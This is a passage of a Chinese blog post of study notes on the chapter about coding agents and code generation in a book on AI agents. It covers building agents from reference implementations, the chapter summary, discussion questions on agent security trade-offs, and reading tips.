+<p>上下文管理的随意性（未采用标准上下文格式、轨迹转纯文本塞进上下文、忽略结构化消息的 KV Cache 优化、工具调用循环边界 bug）；</p>
+</li>
+<li>
+<p>工具设计的不规范（描述简略、缺少使用边界说明和负面清单、参数缺乏具体示例）；</p>
+</li>
+<li>
+<p>技术选型的滞后性（倾向使用训练数据中最常见但已过时的模型和 API）——解决：维护 SOTA 知识库或赋予搜索能力；</p>
+</li>
+<li>
+<p>外部生态的脱节（使用废弃 API、不再维护的库、有缺陷的模式）。</p>
+</li>
+<li>
+<p><strong>最有效路径：不是穷尽所有规则，而是提供高质量 Agent 实现作为参考范例</strong>，引导代码生成 Agent 在此基础上修改而非从零开始。<strong>&ldquo;基于范例的生成&quot;优势</strong>：范例代码本身就是最佳实践载体，Agent 在范例上改比从零写更容易做对，架构上的好选择自然保留，不需要在提示词里把每条规则说清楚。</p>
+</li>
+<li>
+<p>模式：&ldquo;自我复制并适应性修改&rdquo;——先复制自己的代码（或其他经过验证的高质量实现）→ 针对性修改（调整系统提示词匹配新角色、替换或增删工具适应新功能、修改业务逻辑保留架构框架）——像生物学中的基因复制加变异。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>实验 5-12 ★★★（开发能创造 Agent 的 Agent）：提供高质量 Agent 实现作参考范例（可用 ch5/coding-agent 项目本身），Agent 复制范例代码后按用户需求针对性修改。验收：生成的 Agent 能运行完成基本任务、采用标准消息格式和工具调用协议、使用当前推荐模型和 API、多轮对话上下文状态管理正确；对比从零生成和基于范例修改两种模式，验证后者质量和效率优势。</p>
+</li>
+<li>
+<p><strong>Agent 自举体现代码生成终极应用——能创造 Agent 的 Agent 实现智能的自我繁殖</strong>。</p>
+</li>
+</ul>
+<hr>
+<h2 id="3-">3. 本章小结（书中原文要点）</h2>
+<ul>
+<li>
+<p>本章讨论的核心始终是同一件事：<strong>代码不只是写程序的工具，它是 Agent 形式化思考和精确表达的语言</strong>。</p>
+</li>
+<li>
+<p>Harness 工程核心结论：<strong>Coding Agent 成熟度高，不是因为代码生成模型特别强，而是因为软件工程几十年攒下的基础设施——测试套件、类型系统、版本控制——天然构成了一套强大的 Harness</strong>。这个结论值得推广到其他 Agent 场景。</p>
+</li>
+<li>
+<p>故障与错误恢复同一主题的另一面：<strong>Agent 的可靠性不取决于模型犯不犯错，而取决于每类故障是否都有对应的检测、恢复与终止路径</strong>。</p>
+</li>
+<li>
+<p>代码生成在编程之外的六个维度价值：</p>
+<ol>
+<li>
+<p>思考工具：借助符号计算和约束求解弥补概率思考的不足；</p>
+</li>
+<li>
+<p>业务规则约束：无歧义表达业务规则，在不可逆操作场景提供确定性安全防线——安全保障价值远超实现成本；</p>
+</li>
+<li>
+<p>多媒体生成：通过提议者-审核者机制创建 PPT、视频等多模态内容；</p>
+</li>
+<li>
+<p>系统适配器：自动跟随格式演化实现日志解析和问题诊断完全自动化；</p>
+</li>
+<li>
+<p>生成式 UI：动态创建表单、可视化图表甚至完整可定制应用，突破纯文本限制；</p>
+</li>
+<li>
+<p>Agent 自举：用代码修复和创造同类 Agent，实现能创造 Agent 的 Agent。</p>
+</li>
+</ol>
+</li>
+<li>
+<p>代码对 Agent 的价值：<strong>既是完成任务的手段，也是积累知识、创造工具、优化自身的机制——一种真正的&quot;元能力&rdquo;</strong>。</p>
+</li>
+<li>
+<p>至此完成全书&quot;构建 Agent&quot;部分。下一章转向&quot;评估与进化&rdquo;：第六章构建从评估环境、数据集到自动化判断和模型选型的方法论；第七、八章分别讨论参数层和整个 Agent 系统的持续改进。</p>
+</li>
+</ul>
+<hr>
+<h2 id="4--9-">4. 思考题（共 9 道，星级标注）</h2>
+<ul>
+<li>
+<p>★★ 代码生成被称为 Agent 的&quot;元能力&rdquo;。但代码执行引入安全风险——Agent 生成的代码可能包含漏洞、无限循环或资源耗尽。沙盒隔离能解决部分问题但也限制了代码能力（无法访问网络或文件系统）。如何在安全性和能力之间找到最优平衡点？</p>
+</li>
+<li>
+<p>★★★ Agent 自举——能创造 Agent 的 Agent——实现&quot;智能的自我繁殖&rdquo;。但每次自举都可能引入新的偏差或错误，这种错误会在代际间累积吗？如何防止 Agent 自举的退化？</p>
+</li>
+<li>
+<p>★★ 代码生成 Agent 处理日志解析时能自动跟随格式演化。但如果格式变化是一个 bug 而非预期改动，Agent 的适应性反而掩盖了问题。Agent 应该如何区分&quot;需要适应的变化&quot;和&quot;需要报告的异常&rdquo;？</p>
+</li>
+<li>
+<p>★★ 本章在 PPT 生成、视频编辑和日志可视化中反复使用提议者-审核者机制。如果 Reviewer 的审美偏好与目标用户不一致（Reviewer 认为信息密度合理但用户觉得太拥挤），反馈循环会收敛到错误的局部最优。如何让用户的偏好反馈也参与 Reviewer 循环？</p>
+</li>
+<li>
+<p>★★ 本章展示了 Coding Agent 把执行和调试中获得的经验沉淀回代码库的多种方式——写入知识库文件、更新架构文档、维护项目指令文件、把操作序列固化为代码。如果把这些经验进一步提炼为系统提示词中的规则，规则集会随时间不断膨胀。如何对沉淀下来的规则做&quot;垃圾回收&quot;——识别并清理冗余或过时的条目？为什么一次成功的代码修改还不能直接视为第八章所说的持续进化？</p>
+</li>
+<li>
+<p>★ &ldquo;对远程工作友好的团队往往也对 AI Agent 友好。&ldquo;你所在的团队或组织，在知识文档化方面距离&quot;AI-ready&quot;还有多远？最大的障碍是什么？</p>
+</li>
+<li>
+<p>★★★ Simon Willison 提出 Agent 的&quot;致命三要素&rdquo;（访问私有数据、暴露于不受信任内容、具备外部通信能力），本章在此基础上增加第四个——持久记忆。在一个需要同时处理这四种要素的生产环境中，你会如何设计安全策略？</p>
+</li>
+<li>
+<p>★★ Artifact 模式让 Agent 生成的 SQL 或前端代码直接在用户浏览器或数据库中执行。但生成的 SQL 可能执行破坏性操作，生成的 HTML 可能包含漏洞。如何确保系统的安全性？</p>
+</li>
+<li>
+<p>★★ 将业务规则编码为工具内部基于数据库真值的校验，并用参数设计引导模型在调用前核对政策条件，本质上是用代码结构约束 Agent 行为。这种&quot;代码即规则&quot;模式相比自然语言规则有什么优势和局限？</p>
+</li>
+<li>
+<p>★★ Artifact 模式让 Agent 生成 SQL 或可视化代码由前端直接执行、绕过 LLM 处理大量数据。这种&quot;Agent 生成代码，系统执行代码&quot;的分工模式，与传统的&quot;Agent 直接给出答案&quot;模式相比，有什么优劣？</p>
+</li>
+</ul>
+<hr>
+<h2 id="heading">阅读提示</h2>
+<ul>
+<li>
+<p>本章分两大部分：前一半（5.1）构建可靠的 Coding Agent（七个核心工具、OpenClaw 案例、Sessionless、安全、整体流程、Harness 实践、故障恢复、实现技巧、搜索工具、编辑工具）；后一半（5.2）展开代码作为元能力的六个方向（思考/规则/多媒体/适配器/UI/自举）。</p>
+</li>
+<li>
+<p>章内实验 12 个（5-1 数学思考 ★★ / 5-2 逻辑思考 ★★ / 5-3 小模型规则执行 ★★ / 5-4 论文 PPT ★★ / 5-5 讲解视频 ★★ / 5-6 视频剪辑 ★★ / 5-7 自适应日志解析 ★★★ / 5-8 生产日志诊断 ★★★ / 5-9 动态表单 ★★ / 5-10 ERP Agent ★★ / 5-11 界面定制 ★★ / 5-12 Agent 自举 ★★★），配套仓库 chapter5/。</p>
+</li>
+<li>
+<p>引用的关键文献：Li, Bojie &amp; Noah Shi &ldquo;Whose Side Is Your Agent On? Multi-Party Principal Loyalty in LLM Agents&rdquo;（arXiv:2606.30383）；Li, Bojie &ldquo;The Application Layer Is No Longer Trusted&rdquo;（待发表）；Simon Willison 的&quot;致命三要素&rdquo;；τ-bench 基准；Slidev/Blender/FFmpeg 工具链。</p>
+</li>
+<li>
+<p>与前后章衔接：七个核心工具呼应第四章 MCP；提议者-审核者与第四章事前审批同源；故障恢复系统回答第一章思考题；RLVP 与第七章 reward hacking 呼应；自举与第八章自我修改分工（第五章讲&quot;怎么写代码&quot;，第八章讲&quot;什么运行证据触发修改、如何发布回滚&quot;）。</p>
+</li>
+<li>
+<p>若想实践，优先做三件事：①项目加 CLAUDE.md/AGENTS.md 指令文件（最经济的稳定前缀 + 知识显式化）；②关键业务规则按&quot;三重保障&quot;落地（提示词规则 + expected_* checklist + 服务端真值校验守门）；③给执行环境加状态栏（工作目录/git 分支/变更概览）和持久终端会话，收益立竿见影。</p>
+</li>
+</ul>
+
+</article>
+
+
+<section class="series-playlist">
+  <h3 class="series-playlist-title">深入理解AI Agent（12 篇）</h3>
+  <ol class="series-playlist-list">
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-00-%e5%af%bc%e8%af%bb%e4%b8%8e%e5%85%a8%e4%b9%a6%e7%bb%93%e6%9e%84/">《深入理解 AI Agent》精读：导读与全书结构</a>
+      
+    </li>
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-01-AI-Agent-%e5%85%a5%e9%97%a8/">《深入理解 AI Agent》精读：第一章 AI Agent 入门</a>
+      
+    </li>
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-02-%e4%b8%8a%e4%b8%8b%e6%96%87%e5%b7%a5%e7%a8%8b/">《深入理解 AI Agent》精读：第二章 上下文工程</a>
+      
+    </li>
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-03-%e7%94%a8%e6%88%b7%e8%ae%b0%e5%bf%86%e5%92%8c%e7%9f%a5%e8%af%86%e5%ba%93/">《深入理解 AI Agent》精读：第三章 用户记忆和知识库</a>
+      
+    </li>
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-04-%e5%b7%a5%e5%85%b7/">《深入理解 AI Agent》精读：第四章 工具</a>
+      
+    </li>
+    
+    <li class="series-playlist-item current">
+      
+      <span class="series-playlist-text">《深入理解 AI Agent》精读：第五章 Coding Agent 与代码生成</span>
+      
+    </li>
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-06-Agent-%e7%9a%84%e8%af%84%e4%bc%b0/">《深入理解 AI Agent》精读：第六章 Agent 的评估</a>
+      
+    </li>
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-07-%e6%a8%a1%e5%9e%8b%e5%90%8e%e8%ae%ad%e7%bb%83/">《深入理解 AI Agent》精读：第七章 模型后训练</a>
+      
+    </li>
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-08-Agent-%e7%9a%84%e6%8c%81%e7%bb%ad%e8%bf%9b%e5%8c%96/">《深入理解 AI Agent》精读：第八章 Agent 的持续进化</a>
+      
+    </li>
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-09-%e5%a4%9a%e6%a8%a1%e6%80%81%e4%b8%8e%e5%ae%9e%e6%97%b6%e4%ba%a4%e4%ba%92/">《深入理解 AI Agent》精读：第九章 多模态与实时交互</a>
+      
+    </li>
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-10-%e5%a4%9a-Agent-%e5%8d%8f%e4%bd%9c/">《深入理解 AI Agent》精读：第十章 多 Agent 协作</a>
+      
+    </li>
+    
+    <li class="series-playlist-item">
+      
+      <a class="series-playlist-link" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-11-%e5%90%8e%e8%ae%b0/">《深入理解 AI Agent》精读：后记</a>
+      
+    </li>
+    
+  </ol>
+</section>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+  
+    
+  
+  
+    
+  
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link prev" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-04-%e5%b7%a5%e5%85%b7/">
+    <span class="post-nav-label">Previous</span>
+    <span class="post-nav-title">《深入理解 AI Agent》精读：第四章 工具</span>
+  </a>
+  
+  
+  <a class="post-nav-link next" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-06-Agent-%e7%9a%84%e8%af%84%e4%bc%b0/">
+    <span class="post-nav-label">Next</span>
+    <span class="post-nav-title">《深入理解 AI Agent》精读：第六章 Agent 的评估</span>
+  </a>
+  
+</nav>
+
+
+
+<section class="related-posts">
+  <h3 class="related-title">相关文章</h3>
+  <div class="related-grid">
+    
+    <a class="related-card" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-00-%e5%af%bc%e8%af%bb%e4%b8%8e%e5%85%a8%e4%b9%a6%e7%bb%93%e6%9e%84/">
+      <span class="related-card-title">《深入理解 AI Agent》精读：导读与全书结构</span>
+      <span class="related-card-date">2026-08-04</span>
+    </a>
+    
+    <a class="related-card" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-04-%e5%b7%a5%e5%85%b7/">
+      <span class="related-card-title">《深入理解 AI Agent》精读：第四章 工具</span>
+      <span class="related-card-date">2026-08-04</span>
+    </a>
+    
+    <a class="related-card" href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-06-Agent-%e7%9a%84%e8%af%84%e4%bc%b0/">
+      <span class="related-card-title">《深入理解 AI Agent》精读：第六章 Agent 的评估</span>
+      <span class="related-card-date">2026-08-04</span>
+    </a>
+    
+  </div>
+</section>
+
+
+  </div>
+  
+<aside class="sidebar-area">
+  
+  
+  
+  <div class="sidebar-widget">
+    <h3 class="sidebar-widget-title">Recent Posts</h3>
+    <ul class="sidebar-post-list">
+      
+      
+      <li class="sidebar-post-item">
+        <a href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-00-%e5%af%bc%e8%af%bb%e4%b8%8e%e5%85%a8%e4%b9%a6%e7%bb%93%e6%9e%84/">《深入理解 AI Agent》精读：导读与全书结构</a>
+        <span class="sidebar-post-date">2026-08-04</span>
+      </li>
+      
+      
+      
+      <li class="sidebar-post-item">
+        <a href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-01-AI-Agent-%e5%85%a5%e9%97%a8/">《深入理解 AI Agent》精读：第一章 AI Agent 入门</a>
+        <span class="sidebar-post-date">2026-08-04</span>
+      </li>
+      
+      
+      
+      <li class="sidebar-post-item">
+        <a href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-02-%e4%b8%8a%e4%b8%8b%e6%96%87%e5%b7%a5%e7%a8%8b/">《深入理解 AI Agent》精读：第二章 上下文工程</a>
+        <span class="sidebar-post-date">2026-08-04</span>
+      </li>
+      
+      
+      
+      <li class="sidebar-post-item">
+        <a href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-03-%e7%94%a8%e6%88%b7%e8%ae%b0%e5%bf%86%e5%92%8c%e7%9f%a5%e8%af%86%e5%ba%93/">《深入理解 AI Agent》精读：第三章 用户记忆和知识库</a>
+        <span class="sidebar-post-date">2026-08-04</span>
+      </li>
+      
+      
+      
+      <li class="sidebar-post-item">
+        <a href="/posts/AI/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI-Agent-04-%e5%b7%a5%e5%85%b7/">《深入理解 AI Agent》精读：第四章 工具</a>
+        <span class="sidebar-post-date">2026-08-04</span>
+      </li>
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+    </ul>
+  </div>
+  
+
+  
+  
+  
+  <div class="sidebar-widget">
+    <h3 class="sidebar-widget-title">Tags</h3>
+    <div class="sidebar-tag-list">
+      
+      <a class="sidebar-tag" href="/tags/A2A/">A2A</a>
+      
+      <a class="sidebar-tag" href="/tags/ACL/">ACL</a>
+      
+      <a class="sidebar-tag" href="/tags/AI/">AI</a>
+      
+      <a class="sidebar-tag" href="/tags/AI%20Agent/">AI Agent</a>
+      
+      <a class="sidebar-tag" href="/tags/AI%20Native/">AI Native</a>
+      
+      <a class="sidebar-tag" href="/tags/AI%e5%b0%8f%e8%af%b4/">AI小说</a>
+      
+      <a class="sidebar-tag" href="/tags/AI%e5%ba%94%e7%94%a8/">AI应用</a>
+      
+      <a class="sidebar-tag" href="/tags/AKShare/">AKShare</a>
+      
+      <a class="sidebar-tag" href="/tags/Abstract/">Abstract</a>
+      
+      <a class="sidebar-tag" href="/tags/Agent/">Agent</a>
+      
+      <a class="sidebar-tag" href="/tags/Apollo/">Apollo</a>
+      
+      <a class="sidebar-tag" href="/tags/Architecture/">Architecture</a>
+      
+      <a class="sidebar-tag" href="/tags/BackTracking/">BackTracking</a>
+      
+      <a class="sidebar-tag" href="/tags/COLING/">COLING</a>
+      
+      <a class="sidebar-tag" href="/tags/CPU/">CPU</a>
+      
+      <a class="sidebar-tag" href="/tags/CS224N/">CS224N</a>
+      
+      <a class="sidebar-tag" href="/tags/Cache/">Cache</a>
+      
+      <a class="sidebar-tag" href="/tags/Chenhai/">Chenhai</a>
+      
+      <a class="sidebar-tag" href="/tags/Cloud%20Native/">Cloud Native</a>
+      
+      <a class="sidebar-tag" href="/tags/Coding%20Agent/">Coding Agent</a>
+      
+      <a class="sidebar-tag" href="/tags/Computer%20Use/">Computer Use</a>
+      
+      <a class="sidebar-tag" href="/tags/DP/">DP</a>
+      
+      <a class="sidebar-tag" href="/tags/Daily%20Dev/">Daily Dev</a>
+      
+      <a class="sidebar-tag" href="/tags/DeepSeek/">DeepSeek</a>
+      
+      <a class="sidebar-tag" href="/tags/Design%20Pattern/">Design Pattern</a>
+      
+      <a class="sidebar-tag" href="/tags/EMNLP/">EMNLP</a>
+      
+      <a class="sidebar-tag" href="/tags/FastAPI/">FastAPI</a>
+      
+      <a class="sidebar-tag" href="/tags/Few-Shot/">Few-Shot</a>
+      
+      <a class="sidebar-tag" href="/tags/Few-Shot%20Learning/">Few-Shot Learning</a>
+      
+      <a class="sidebar-tag" href="/tags/GGUF/">GGUF</a>
+      
+      <a class="sidebar-tag" href="/tags/GPT/">GPT</a>
+      
+      <a class="sidebar-tag" href="/tags/Go/">Go</a>
+      
+      <a class="sidebar-tag" href="/tags/Golang/">Golang</a>
+      
+      <a class="sidebar-tag" href="/tags/Graph/">Graph</a>
+      
+      <a class="sidebar-tag" href="/tags/HTTP/">HTTP</a>
+      
+      <a class="sidebar-tag" href="/tags/Hermes%20Agent/">Hermes Agent</a>
+      
+      <a class="sidebar-tag" href="/tags/I/O/">I/O</a>
+      
+      <a class="sidebar-tag" href="/tags/IO/">IO</a>
+      
+      <a class="sidebar-tag" href="/tags/KV%20Cache/">KV Cache</a>
+      
+      <a class="sidebar-tag" href="/tags/Kafka/">Kafka</a>
+      
+      <a class="sidebar-tag" href="/tags/Kanban/">Kanban</a>
+      
+      <a class="sidebar-tag" href="/tags/KnowledgeGraph/">KnowledgeGraph</a>
+      
+      <a class="sidebar-tag" href="/tags/Kubernetes/">Kubernetes</a>
+      
+      <a class="sidebar-tag" href="/tags/LLM/">LLM</a>
+      
+      <a class="sidebar-tag" href="/tags/LLM-as-a-Judge/">LLM-as-a-Judge</a>
+      
+      <a class="sidebar-tag" href="/tags/LRU/">LRU</a>
+      
+      <a class="sidebar-tag" href="/tags/LangChain/">LangChain</a>
+      
+      <a class="sidebar-tag" href="/tags/LangGraph/">LangGraph</a>
+      
+      <a class="sidebar-tag" href="/tags/Leetcode/">Leetcode</a>
+      
+      <a class="sidebar-tag" href="/tags/Linked%20List/">Linked List</a>
+      
+      <a class="sidebar-tag" href="/tags/Linux/">Linux</a>
+      
+      <a class="sidebar-tag" href="/tags/LlamaIndex/">LlamaIndex</a>
+      
+      <a class="sidebar-tag" href="/tags/LoRA/">LoRA</a>
+      
+      <a class="sidebar-tag" href="/tags/MCP/">MCP</a>
+      
+      <a class="sidebar-tag" href="/tags/Meta%20Learning/">Meta Learning</a>
+      
+      <a class="sidebar-tag" href="/tags/Micro%20Service/">Micro Service</a>
+      
+      <a class="sidebar-tag" href="/tags/Mixture%20of%20Agents/">Mixture of Agents</a>
+      
+      <a class="sidebar-tag" href="/tags/MoA/">MoA</a>
+      
+      <a class="sidebar-tag" href="/tags/Mock%20Testing/">Mock Testing</a>
+      
+      <a class="sidebar-tag" href="/tags/MongoDB/">MongoDB</a>
+      
+      <a class="sidebar-tag" href="/tags/MultiAgent/">MultiAgent</a>
+      
+      <a class="sidebar-tag" href="/tags/MySQL/">MySQL</a>
+      
+      <a class="sidebar-tag" href="/tags/NAACL/">NAACL</a>
+      
+      <a class="sidebar-tag" href="/tags/NER/">NER</a>
+      
+      <a class="sidebar-tag" href="/tags/NLP/">NLP</a>
+      
+      <a class="sidebar-tag" href="/tags/NN/">NN</a>
+      
+      <a class="sidebar-tag" href="/tags/Neo4j/">Neo4j</a>
+      
+      <a class="sidebar-tag" href="/tags/PaperNotes/">PaperNotes</a>
+      
+      <a class="sidebar-tag" href="/tags/Paxos/">Paxos</a>
+      
+      <a class="sidebar-tag" href="/tags/PostgreSQL/">PostgreSQL</a>
+      
+      <a class="sidebar-tag" href="/tags/Practise/">Practise</a>
+      
+      <a class="sidebar-tag" href="/tags/Project%20Dev/">Project Dev</a>
+      
+      <a class="sidebar-tag" href="/tags/Prompt/">Prompt</a>
+      
+      <a class="sidebar-tag" href="/tags/Python/">Python</a>
+      
+      <a class="sidebar-tag" href="/tags/Qwen/">Qwen</a>
+      
+      <a class="sidebar-tag" href="/tags/RAG/">RAG</a>
+      
+      <a class="sidebar-tag" href="/tags/RE/">RE</a>
+      
+      <a class="sidebar-tag" href="/tags/RL/">RL</a>
+      
+      <a class="sidebar-tag" href="/tags/RNN/">RNN</a>
+      
+      <a class="sidebar-tag" href="/tags/RPC/">RPC</a>
+      
+      <a class="sidebar-tag" href="/tags/RabbitMQ/">RabbitMQ</a>
+      
+      <a class="sidebar-tag" href="/tags/Raft/">Raft</a>
+      
